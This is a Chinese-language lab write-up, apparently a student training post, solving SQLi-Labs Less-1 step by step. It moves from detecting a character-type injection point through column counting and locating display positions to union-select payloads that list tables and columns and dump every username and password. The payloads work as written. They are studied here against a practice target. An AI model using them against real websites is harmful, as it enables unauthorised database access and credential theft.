---
title: "SQLi-Labs Less-1字符型联合查询注入实战"
published: 2025-01-01
description: "SQLi-Labs Less-1关卡字符型SQL注入的完整流程，包括注入点判断、字段数探测、联合查询回显定位及数据库信息获取。"
tags: ["SQL注入", "SQLi-Labs", "Union查询", "字符型注入", "Web安全"]
category: "大三下实训"
---

SQL注入 Less-1：

进入靶场，发现没有任何输入框，只能从网址url框进行操作。首先要判断是有回显还是无回显。

![图片](./images/jr4_less1_img1.png)

尝试输入?id=1和?id=2，均有回显，发现能查询到对应id的用户名和密码，由此发现输入不同的id能查询到不同的账户和密码。

![图片](./images/jr4_less1_img2.png)

![图片](./images/jr4_less1_img3.png)

如果输入?id=-1，则没有任何回显，所以id输入非正数是错误的输入，得不到任何输出。由此可见，这一关属于有回显式

![图片](./images/jr4_less1_img4.png)

判断注入点类型—单引号测试

输入?id=1’

报错，属于字符型注入，SQL语法有错误！

![图片](./images/jr4_less1_img5.png)

在后面加上 --+，发现能正常回显用户名和密码

![图片](./images/jr4_less1_img6.png)

尝试id=1’ and 1=1 --+

![图片](./images/jr4_less1_img7.png)

尝试id=1’ and 1=2 --+，没有回显，验证出：若是数字不相等依然报错

![图片](./images/jr4_less1_img8.png)

判断字符数

用order by查询字段个数，从1开始，然后慢慢增加数字，直到报错

![图片](./images/jr4_less1_img9.png)

继续尝试order by 2和3，结果都和上图一样，正常

但当order by 4的时候，出现了报错，所以证明有3个字段

![图片](./images/jr4_less1_img10.png)

使用联合查询确定显示位置

Id=1’ union select 1,2,3 --+

![图片](./images/jr4_less1_img11.png)

因为查询语句前面是对的，所以显示前面的内容，后面的无法显示，不能确定显示的位置，所以用id=-1’这种错误的输入，来显示后面的内容，以确定显示的位置

![图片](./images/jr4_less1_img12.png)

成功确定显示位置！

查询数据库的名称

![图片](./images/jr4_less1_img13.png)

得到数据库库名为security

查询表名

?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+

![图片](./images/jr4_less1_img14.png)

查询到四个表名分别为emails、referers、uagents和users

查询users表的列名

?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+

![图片](./images/jr4_less1_img15.png)

查询所有的用户名和密码

?id=-1' union select 1,group_concat(username,'~',password),3 from users --+

![图片](./images/jr4_less1_img16.png)
